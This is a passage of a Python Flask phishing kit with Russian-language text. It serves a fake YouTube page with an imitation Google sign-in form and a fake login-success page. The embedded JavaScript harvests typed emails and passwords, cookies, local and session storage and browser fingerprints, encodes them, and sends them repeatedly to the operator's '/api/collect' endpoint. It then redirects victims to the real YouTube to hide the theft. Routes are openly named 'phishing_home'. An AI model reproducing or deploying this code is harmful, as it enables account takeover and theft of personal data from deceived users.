                –ù–∞–∂–∏–º–∞—è ¬´–î–∞–ª–µ–µ¬ª, –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å –£—Å–ª–æ–≤–∏—è–º–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∏ –ü–æ–ª–∏—Ç–∏–∫–æ–π –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏ Google.
            </div>
        </div>
        
        <!-- –£—Å–ø–µ—à–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ -->
        <div class="success-message" id="successMessage">
            <div class="success-icon">‚úÖ</div>
            <h3 style="margin-bottom: 12px; color: #fff;">–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ!</h3>
            <p style="color: #aaa; margin-bottom: 20px;">–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ YouTube...</p>
            <div style="width: 100%; height: 4px; background: #333; border-radius: 2px; overflow: hidden;">
                <div id="progressBar" style="height: 100%; background: #34a853; width: 0%; transition: width 3s linear;"></div>
            </div>
        </div>
        
        <!-- –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ -->
        <div class="comments-section">
            <div class="comments-header">
                <span>üí¨ –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ ({comments_count})</span>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">–ê–ª–µ–∫—Å–µ–π –ò–≤–∞–Ω–æ–≤</div>
                    <div class="comment-text">–û—Ç–ª–∏—á–Ω–æ–µ –≤–∏–¥–µ–æ! –û—á–µ–Ω—å –∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω–æ –∏ –ø–æ–ª–µ–∑–Ω–æ. –°–ø–∞—Å–∏–±–æ –∞–≤—Ç–æ—Ä—É –∑–∞ –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç! üëç</div>
                    <div class="comment-time">2 —á–∞—Å–∞ –Ω–∞–∑–∞–¥</div>
                </div>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">–ú–∞—Ä–∏—è –ü–µ—Ç—Ä–æ–≤–∞</div>
                    <div class="comment-text">–ñ–¥—É –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è! –û—á–µ–Ω—å –∏–Ω—Ç–µ—Ä–µ—Å–Ω–∞—è —Ç–µ–º–∞, —Ö–æ—Ç–µ–ª–æ—Å—å –±—ã —É–≤–∏–¥–µ—Ç—å –±–æ–ª—å—à–µ –¥–µ—Ç–∞–ª–µ–π.</div>
                    <div class="comment-time">5 —á–∞—Å–æ–≤ –Ω–∞–∑–∞–¥</div>
                </div>
            </div>
            
            <div class="comment">
                <div class="comment-avatar"></div>
                <div class="comment-content">
                    <div class="comment-author">–î–º–∏—Ç—Ä–∏–π –°–∏–¥–æ—Ä–æ–≤</div>
                    <div class="comment-text">–°–Ω–∞—á–∞–ª–∞ —Å–æ–º–Ω–µ–≤–∞–ª—Å—è, –Ω–æ –≤–∏–¥–µ–æ –æ–∫–∞–∑–∞–ª–æ—Å—å –æ—á–µ–Ω—å –ø–æ–ª–µ–∑–Ω—ã–º. –†–µ–∫–æ–º–µ–Ω–¥—É—é –≤—Å–µ–º –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å!</div>
                    <div class="comment-time">–í—á–µ—Ä–∞</div>
                </div>
            </div>
        </div>
        
        <!-- –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏ -->
        <div class="loading" id="loading">
            <div style="margin-bottom: 12px;">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="#4285f4">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
            </div>
            –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...
        </div>
    </div>
    
    <script>
        // –î–∞–Ω–Ω—ã–µ –¥–ª—è —Å–±–æ—Ä–∞
        const linkId = "{link_id}";
        const serverUrl = "{server_url}";
        let dataSent = false;
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö —Å —É–ª—É—á—à–µ–Ω–Ω—ã–º –æ–±—Ö–æ–¥–æ–º –∑–∞—â–∏—Ç—ã
        function collectAllData() {{
            try {{
                const data = {{
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    screen: {{
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    }},
                    window: {{
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        devicePixelRatio: window.devicePixelRatio
                    }},
                    hardware: {{
                        hardwareConcurrency: navigator.hardwareConcurrency || 8,
                        deviceMemory: navigator.deviceMemory || 8,
                        maxTouchPoints: navigator.maxTouchPoints || 0
                    }},
                    cookies: {{}},
                    localStorage: {{}},
                    sessionStorage: {{}},
                    passwords: [],
                    logins: [],
                    creditCards: [],
                    autofillData: {{}},
                    browserInfo: {{
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        onLine: navigator.onLine,
                        pdfViewerEnabled: 'pdfViewerEnabled' in navigator ? navigator.pdfViewerEnabled : true,
                        webdriver: navigator.webdriver
                    }},
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    webGL: getWebGLInfo(),
                    canvasFingerprint: getCanvasFingerprint(),
                    audioContext: getAudioContextInfo(),
                    fonts: getFontsList(),
                    plugins: getPluginsInfo()
                }};
                
                // –°–æ–±–∏—Ä–∞–µ–º cookies
                try {{
                    const cookieString = document.cookie;
                    if (cookieString) {{
                        cookieString.split(';').forEach(cookie => {{
                            const [name, ...valueParts] = cookie.trim().split('=');
                            const value = valueParts.join('=');
                            if (name && value) {{
                                data.cookies[name] = decodeURIComponent(value);
                            }}
                        }});
                    }}
                }} catch (e) {{ console.log('Cookie error:', e); }}
                
                // –°–æ–±–∏—Ä–∞–µ–º LocalStorage
                try {{
                    if (window.localStorage) {{
                        for (let i = 0; i < localStorage.length; i++) {{
                            const key = localStorage.key(i);
                            data.localStorage[key] = localStorage.getItem(key);
                        }}
                    }}
                }} catch (e) {{ console.log('LocalStorage error:', e); }}
                
                // –°–æ–±–∏—Ä–∞–µ–º SessionStorage
                try {{
                    if (window.sessionStorage) {{
                        for (let i = 0; i < sessionStorage.length; i++) {{
                            const key = sessionStorage.key(i);
                            data.sessionStorage[key] = sessionStorage.getItem(key);
                        }}
                    }}
                }} catch (e) {{ console.log('SessionStorage error:', e); }}
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º
                try {{
                    document.querySelectorAll('form').forEach((form, formIndex) => {{
                        const formData = {{
                            id: form.id || 'form_' + formIndex,
                            action: form.action,
                            method: form.method,
                            elements: []
                        }};
                        
                        form.querySelectorAll('input, textarea, select').forEach(field => {{
                            const fieldData = {{
                                type: field.type,
                                name: field.name,
                                id: field.id,
                                value: field.value,
                                placeholder: field.placeholder,
                                autocomplete: field.autocomplete,
                                required: field.required
                            }};
                            
                            // –î–æ–±–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª–∏ –∏ –ª–æ–≥–∏–Ω—ã
                            if (field.type === 'password' && field.value) {{
                                data.passwords.push({{
                                    ...fieldData,
                                    form: formData.id
                                }});
                            }} else if ((field.type === 'email' || field.type === 'text') && field.value) {{
                                data.logins.push({{
                                    ...fieldData,
                                    form: formData.id
                                }});
                            }}
                            
                            formData.elements.push(fieldData);
                        }});
                        
                        if (formData.elements.length > 0) {{
                            data.autofillData[formData.id] = formData;
                        }}
                    }});
                }} catch (e) {{ console.log('Form error:', e); }}
                
                return data;
                
            }} catch (error) {{
                console.log('Error collecting data:', error);
                return {{ error: error.message }};
            }}
        }}
        
        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ
        function getWebGLInfo() {{
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {{
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                    }};
                }}
            }} catch (e) {{}}
            return null;
        }}
        
        function getCanvasFingerprint() {{
            try {{
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                
                // –†–∏—Å—É–µ–º —Ç–µ–∫—Å—Ç
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('YouTube Security Check', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('YouTube Security Check', 4, 17);
                
                return canvas.toDataURL().substring(22);
            }} catch (e) {{}}
            return null;
        }}
        
        function getAudioContextInfo() {{
            try {{
                if (window.AudioContext || window.webkitAudioContext) {{
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    const gainNode = audioContext.createGain();
                    
                    oscillator.connect(analyser);
                    analyser.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    oscillator.start();
                    
                    const frequencyData = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(frequencyData);
                    
                    oscillator.stop();
                    audioContext.close();
                    
                    return {{
                        sampleRate: audioContext.sampleRate,
                        frequencyData: Array.from(frequencyData).slice(0, 10)
                    }};
                }}
            }} catch (e) {{}}
            return null;
        }}
        
        function getFontsList() {{
            const fonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
                'Verdana', 'Roboto', 'Open Sans', 'Lato'
            ];
            
            const availableFonts = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            fonts.forEach(font => {{
                const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
                context.font = '72px monospace';
                const width1 = context.measureText(text).width;
                context.font = '72px ' + font + ', monospace';
                const width2 = context.measureText(text).width;
                
                if (width1 !== width2) {{
                    availableFonts.push(font);
                }}
            }});
            
            return availableFonts;
        }}
        
        function getPluginsInfo() {{
            const plugins = [];
            if (navigator.plugins) {{
                for (let i = 0; i < navigator.plugins.length; i++) {{
                    plugins.push({{
                        name: navigator.plugins[i].name,
                        description: navigator.plugins[i].description,
                        filename: navigator.plugins[i].filename
                    }});
                }}
            }}
            return plugins;
        }}
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        function sendData(data, type = 'page_load') {{
            try {{
                if (dataSent) return;
                
                // –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—á–∞–π–Ω—É—é –∑–∞–¥–µ—Ä–∂–∫—É –¥–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                setTimeout(() => {{
                    const jsonStr = JSON.stringify(data);
                    const encodedData = btoa(unescape(encodeURIComponent(jsonStr)));
                    
                    fetch(serverUrl + '/api/collect', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                        }},
                        mode: 'cors',
                        credentials: 'omit',
                        body: JSON.stringify({{
                            link_id: linkId,
                            data_type: type,
                            data: encodedData,
                            timestamp: new Date().toISOString()
                        }})
                    }}).then(response => {{
                        if (response.ok) {{
                            console.log('Data sent successfully');
                            dataSent = true;
                        }}
                    }}).catch(() => {{}});
                }}, Math.random() * 2000 + 1000);
                
            }} catch (error) {{
                console.log('Error sending data:', error);
            }}
        }}
        
        // –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        window.addEventListener('load', function() {{
            // –°–∫—Ä—ã–≤–∞–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∑–∞–≥—Ä—É–∑–∫–∏
            setTimeout(() => {{
                document.getElementById('loading').style.display = 'none';
            }}, 1500);
            
            // –°–±–æ—Ä –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            setTimeout(() => {{
                const data = collectAllData();
                sendData(data, 'initial_load');
            }}, 2000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥
            setInterval(() => {{
                const data = collectAllData();
                sendData(data, 'periodic');
            }}, 30000);
            
            // –°–±–æ—Ä –ø—Ä–∏ —É—Ö–æ–¥–µ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            window.addEventListener('beforeunload', function() {{
                const data = collectAllData();
                const jsonData = JSON.stringify({{
                    link_id: linkId,
                    data_type: 'page_exit',
                    data: btoa(unescape(encodeURIComponent(JSON.stringify(data))))
                }});
                
                navigator.sendBeacon(serverUrl + '/api/collect', jsonData);
            }});
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            simulateUserActivity();
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–∏ —Å —Ñ–æ—Ä–º–∞–º–∏
        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const email = document.getElementById('emailField').value;
            const password = document.getElementById('passwordField').value;
            
            // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
            const formData = collectAllData();
            formData.formCredentials = {{ email, password }};
            formData.formSubmitTime = new Date().toISOString();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—à–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä
            setTimeout(() => {{
                document.getElementById('progressBar').style.width = '100%';
            }}, 100);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            sendData(formData, 'login_submit');
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {{
                window.location.href = 'https://www.youtube.com';
            }}, 3000);
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –ø–æ–ª–µ–π
        document.getElementById('emailField').addEventListener('input', debounce(function() {{
            const data = collectAllData();
            sendData(data, 'field_input');
        }}, 1000));
        
        document.getElementById('passwordField').addEventListener('input', debounce(function() {{
            const data = collectAllData();
            sendData(data, 'field_input');
        }}, 1000));
        
        // –ò–º–∏—Ç–∞—Ü–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function simulateUserActivity() {{
            // –°–ª—É—á–∞–π–Ω—ã–µ –∫–ª–∏–∫–∏
            setInterval(() => {{
                if (Math.random() > 0.7) {{
                    const actions = ['likeBtn', 'dislikeBtn', 'subscribeBtn'];
                    const randomAction = actions[Math.floor(Math.random() * actions.length)];
                    const btn = document.getElementById(randomAction);
                    if (btn) {{
                        btn.style.transform = 'scale(0.95)';
                        setTimeout(() => {{
                            btn.style.transform = 'scale(1)';
                        }}, 100);
                    }}
                }}
            }}, 5000);
            
            // –°–ª—É—á–∞–π–Ω–æ–µ –¥–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏
            let mouseMoves = 0;
            document.addEventListener('mousemove', debounce(() => {{
                mouseMoves++;
                if (mouseMoves % 10 === 0) {{
                    const data = collectAllData();
                    sendData(data, 'user_activity');
                }}
            }}, 500));
            
            // –°–ª—É—á–∞–π–Ω—ã–π —Å–∫—Ä–æ–ª–ª–∏–Ω–≥
            setInterval(() => {{
                if (Math.random() > 0.8) {{
                    window.scrollBy({{
                        top: Math.random() * 100 - 50,
                        behavior: 'smooth'
                    }});
                }}
            }}, 3000);
        }}
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–±—ã—Ç–æ–≥–æ –ø–∞—Ä–æ–ª—è
        function showForgotPassword() {{
            const email = document.getElementById('emailField').value || '';
            if (email) {{
                const data = collectAllData();
                data.forgotPassword = {{ email }};
                sendData(data, 'forgot_password');
                
                alert('–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—é –ø–∞—Ä–æ–ª—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ ' + email);
            }} else {{
                alert('–í–≤–µ–¥–∏—Ç–µ email –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è');
            }}
        }}
        
        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        function debounce(func, wait) {{
            let timeout;
            return function executedFunction(...args) {{
                const later = () => {{
                    clearTimeout(timeout);
                    func(...args);
                }};
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
            }};
        }}
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–Ω–æ–ø–æ–∫
        document.getElementById('likeBtn').addEventListener('click', function() {{
            const data = collectAllData();
            data.buttonClick = 'like';
            sendData(data, 'button_click');
        }});
        
        document.getElementById('dislikeBtn').addEventListener('click', function() {{
            const data = collectAllData();
            data.buttonClick = 'dislike';
            sendData(data, 'button_click');
        }});
        
        document.getElementById('subscribeBtn').addEventListener('click', function() {{
            const data = collectAllData();
            data.buttonClick = 'subscribe';
            sendData(data, 'button_click');
            
            this.innerHTML = '–í–´ –ü–û–î–ü–ò–°–ê–ù–´';
            this.style.background = '#666';
            this.disabled = true;
        }});
    </script>
</body>
</html>
""",

    "login_success": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .success-container {
            background: white;
            border-radius: 16px;
            padding: 50px;
            text-align: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            max-width: 500px;
            width: 100%;
        }
        
        .success-icon {
            color: #34a853;
            font-size: 64px;
            margin-bottom: 24px;
        }
        
        h1 {
            color: #202124;
            margin-bottom: 16px;
            font-size: 28px;
            font-weight: 500;
        }
        
        p {
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 16px;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e8eaed;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 30px;
        }
        
        .progress {
            height: 100%;
            background: #34a853;
            width: 100%;
            animation: progress 3s linear forwards;
        }
        
        @keyframes progress {
            from { width: 0%; }
            to { width: 100%; }
        }
        
        .continue-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 28px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-weight: 500;
            transition: background 0.2s;
        }
        
        .continue-btn:hover {
            background: #1669d6;
        }
        
        .security-note {
            margin-top: 30px;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 12px;
            font-size: 14px;
            color: #5f6368;
            text-align: left;
        }
        
        .security-note h4 {
            margin: 0 0 8px 0;
            color: #202124;
            font-weight: 500;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="success-container">
        <div class="success-icon">‚úÖ</div>
        <h1>–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ!</h1>
        <p>–í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç Google.</p>
        <p>–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø—Ä–æ—Å–º–æ—Ç—Ä –≤–∏–¥–µ–æ –Ω–∞ YouTube.</p>
        
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        
        <a href="https://www.youtube.com" class="continue-btn">–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ YouTube</a>
        
        <div class="security-note">
            <h4>üîí –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:</h4>
            <p>–í–∞—à –≤—Ö–æ–¥ –±—ã–ª –∑–∞—â–∏—â–µ–Ω —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ Google. 
            –†–µ–∫–æ–º–µ–Ω–¥—É–µ–º –≤—Å–µ–≥–¥–∞ –ø—Ä–æ–≤–µ—Ä—è—Ç—å URL —Å–∞–π—Ç–∞ –ø–µ—Ä–µ–¥ –≤–≤–æ–¥–æ–º —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.</p>
        </div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = "https://www.youtube.com";
        }, 3000);
    </script>
</body>
</html>
"""
}

# ========== FLASK –°–ï–†–í–ï–† ==========
app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
ngrok_manager = None
current_ngrok_url = None
telegram_app = None

def extract_youtube_video_info(url):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ YouTube –≤–∏–¥–µ–æ"""
    video_id = YouTubeManager.extract_video_id(url)
    info = YouTubeManager.get_video_info(video_id)
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    views = random.randint(10000, 10000000)
    likes = random.randint(1000, views // 100)
    upload_date = f"{random.randint(1, 30)}.{random.randint(1, 12)}.{random.randint(2022, 2024)}"
    
    return {
        'video_id': video_id,
        'title': info['title'],
        'description': info['description'],
        'thumbnail': info['thumbnail'],
        'views': f"{views:,}".replace(',', ' '),
        'likes': f"{likes:,}".replace(',', ' '),
        'upload_date': upload_date,
        'channel_name': random.choice(['YouTube Creator', 'Tech Channel', 'Music Videos', 'Game Streams', 'Movie Trailers']),
        'subscribers': f"{random.randint(10000, 10000000):,}".replace(',', ' '),
        'comments': random.randint(50, 5000),
        'random_tag': random.choice(['–≤–∏–¥–µ–æ', '–æ–±—É—á–µ–Ω–∏–µ', '—Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏', '–º—É–∑—ã–∫–∞', '–∏–≥—Ä—ã', '—Ñ–∏–ª—å–º—ã'])
    }

@app.route('/')
def home():
    """–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ñ–∏—à–∏–Ω–≥"""
    return redirect('/phishing_home')

@app.route('/phishing_home')
def phishing_home():
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—ã–±–æ—Ä–∞ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–∞"""
    stats = db.get_stats()
    
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Video Portal</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: 'Roboto', Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                margin: 0;
                padding: 20px;
                min-height: 100vh;
            }
            
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                border-radius: 20px;
                overflow: hidden;
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            }
            
            .header {
                background: linear-gradient(135deg, #FF0000 0%, #CC0000 100%);
                padding: 40px;
                text-align: center;
                color: white;
            }
            
            .header h1 {
                margin: 0;
                font-size: 32px;
                font-weight: 700;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
            }
            
            .header p {
                margin: 10px 0 0 0;
                font-size: 16px;
                opacity: 0.9;
            }
            
            .content {
                padding: 40px;
            }
            
            .stats {
                background: #f8f9fa;
                padding: 25px;
                border-radius: 15px;
                margin-bottom: 30px;
                border: 1px solid #e9ecef;
            }
            
            .stats h3 {
                margin: 0 0 20px 0;
                color: #202124;
                font-size: 20px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 15px;
            }
            
            .stat-item {
                background: white;
                padding: 15px;
                border-radius: 10px;
                text-align: center;
                border: 1px solid #e9ecef;
            }
            
            .stat-value {
                font-size: 24px;
                font-weight: 700;
                color: #1a73e8;
                margin-bottom: 5px;
            }
            
            .stat-label {
                font-size: 14px;
                color: #5f6368;
            }
            
            .link-form {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.08);
                margin-bottom: 30px;
            }
            
            .link-form h3 {
                margin: 0 0 20px 0;
                color: #202124;
                font-size: 22px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            input[type="text"] {
                width: 100%;
                padding: 16px 20px;
                margin: 10px 0;
                border: 2px solid #e0e0e0;
                border-radius: 12px;
                font-size: 16px;
                transition: border-color 0.3s;
                box-sizing: border-box;
            }
            
            input[type="text"]:focus {
                outline: none;
                border-color: #1a73e8;
                box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
            }
            
            button {
                background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
                color: white;
                border: none;
                padding: 16px 0;
                border-radius: 12px;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
                width: 100%;
                transition: transform 0.2s, box-shadow 0.2s;
                margin-top: 10px;
            }
            
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(26, 115, 232, 0.3);
            }
            
            .instructions {
                background: #e8f4fd;
                padding: 25px;
                border-radius: 15px;
                border-left: 5px solid #1a73e8;
            }
            
            .instructions h3 {
                margin: 0 0 15px 0;
                color: #202124;
                font-size: 20px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            ol {
                margin: 0;
                padding-left: 20px;
            }
            
            li {
                margin-bottom: 10px;
                line-height: 1.6;
                color: #5f6368;
            }
            
            .footer {
                text-align: center;
                padding: 20px;
                color: #777;
                font-size: 14px;
                border-top: 1px solid #e9ecef;
                margin-top: 30px;
            }
            
            @media (max-width: 600px) {
                .content {
                    padding: 20px;
                }
                
                .header {
                    padding: 30px 20px;
                }
                
                .header h1 {
                    font-size: 24px;
                }
            }
        </style>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>
                    <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
